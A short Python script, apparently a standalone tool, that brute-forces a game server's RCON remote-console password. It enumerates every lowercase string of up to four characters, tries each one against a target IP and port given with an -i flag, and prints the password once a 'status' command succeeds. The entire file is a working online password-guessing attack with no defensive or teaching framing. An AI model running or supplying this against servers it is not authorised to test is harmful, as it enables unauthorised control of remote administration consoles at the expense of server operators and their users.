import aiorcon
import asyncio
import string
import time
import sys
import getopt
from itertools import chain, product

ip = "127.0.0.1"
port= "20175"


def ip_port_parse(ip_input):
    global ip
    global port
    ip = ip_input.split(':', 1)[0]
    port = ip_input[ip_input.find(':')+1:]
    if len(ip) > 16:
        raise Exception("Invalid IP!")


def bruteforce_charset(charset, maxlength):
    return (''.join(candidate)
        for candidate in chain.from_iterable(product(charset, repeat=i)
            for i in range(1, maxlength + 1)))


async def attempt_connection(loop, rconpassword):
    # Attempt rcon connection
    rcon = await aiorcon.RCON.create(ip, port, rconpassword, loop)

    # Send a command
    status = await(rcon("status"))
    print(status)
    if 'hostname:' in status:
        print("Password is:", rconpassword)
        rcon.close()
        sys.exit(0)


def bruteforce(chars=string.ascii_lowercase, lenght=4):

    for x in bruteforce_charset(chars, lenght):
        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(attempt_connection(loop, x))
        except Exception as e:
            error_check = repr(e)
        if 'Authentication failed' in error_check:
            print("Fail:", error_check, "  [X]->  ", x)


def arg_parsing(argv):
    opts, args = getopt.getopt(argv, "i:")
    for opt, arg in opts:

        if opt == '-i':
            try:
                ip_port_parse(arg)
            except Exception as e:
                print("Can't parse server address,", e)
                sys.exit(1)


if __name__ == '__main__':

    arg_parsing(sys.argv[1:])
    bruteforce()
